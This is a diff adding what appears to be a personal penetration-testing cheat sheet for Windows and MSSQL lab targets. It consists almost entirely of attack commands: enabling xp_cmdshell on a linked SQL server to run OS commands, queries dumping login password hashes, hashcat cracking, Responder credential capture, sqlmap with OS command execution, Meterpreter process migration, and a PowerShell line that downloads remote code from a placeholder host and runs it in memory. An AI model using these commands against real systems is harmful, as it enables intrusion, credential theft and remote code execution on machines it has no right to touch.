@@ -1,0 +1,39 @@
+#XFREERDP
+xfreerdp +clipboard /u:Administrator /p:lab /v:192.168.58.100 /dynamic-resolution /drive:home,/home
+#IMPACKET-MSCCLIENT
+impacket-mssqlclient -db database domain/user:password@IP
+#ENABLE xp_cmdshell   
+EXEC ('sp_configure 'show advanced options', '1''') AT SQLSERVER
+EXEC ('RECONFIGURE') AT SQLSERVER
+EXEC ('sp_configure 'xp_cmdshell', '1''') AT SQLSERVER
+EXEC ('RECONFIGURE') AT SQLSERVER
+EXEC ('EXEC master..xp_cmdshell ''whoami''') AT SQLSERVER
+EXEC ('EXEC master..xp_cmdshell 'dir C:\users\Administrator''') AT SQLSERVER
+#MSSQL TABLES AND DATABASES
+SELECT name FROM master.dbo.sysdatabases;
+SELECT * FROM gameportal.INFORMATION_SCHEMA.TABLES;
+#LIST USERS
+select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+#COMMON SQL COMMANDS
+Use master
+EXEC sp_helpsrvrolemember 'sysadmin';
+select @@version;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+EXEC sp_linkedservers
+#OPENQUERY
+select user from openquery("SQLSERVER", 'select user_name();')
+select * from openquery("SQLSERVER", 'SELECT name FROM master.dbo.sysdatabases;')
+select * from openquery("SQLSERVER", 'select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then ''Disabled'' else ''Enabled'' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in (''G'', ''R'') order by sp.name;')
+#linux hashes
+hashcat -m 1800 hashes1 /usr/share/wordlists/rockyou.txt
+#ldb files 
+tdbtool ldb-path.ldb dump
+#responder
+sudo responder -I tun0
+#SQLMAP
+sqlmap -u "http://IP/default.asp?uname=admin&psw=admin" --dbms="Microsoft SQL Server 2019" --hex --os-cmd "dir \\\\IP\\test"
+#MIGRATE
+execute -H -f notepad
+migrate 620
+#powershell upload script to memory
+(new-object system.net.webclient).downloadstring('http://IP/file.txt') | IEX
